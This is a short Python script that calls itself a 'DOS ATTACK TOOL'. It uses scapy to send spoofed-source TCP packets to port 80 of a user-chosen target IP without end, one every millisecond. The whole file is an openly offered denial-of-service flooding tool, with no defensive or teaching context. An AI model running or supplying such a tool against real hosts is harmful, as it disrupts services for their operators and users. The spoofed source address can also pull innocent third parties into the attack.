from scapy.all import *

print("DOS ATTACK TOOL \n by Matia Pivirotto")

ip_src = input("Which IP do you want to attack?")
ip_target = input("Which TARGET do you want to attack?")

c = 1

while True:
    IP1 = IP(src = ip_src, dst = ip_target)
    TCP1 = TCP(dport = 80)
    globalLayer = IP1/TCP1

    send(globalLayer,inter = .001)
    print("PCKT sent",c)
    c=c+1
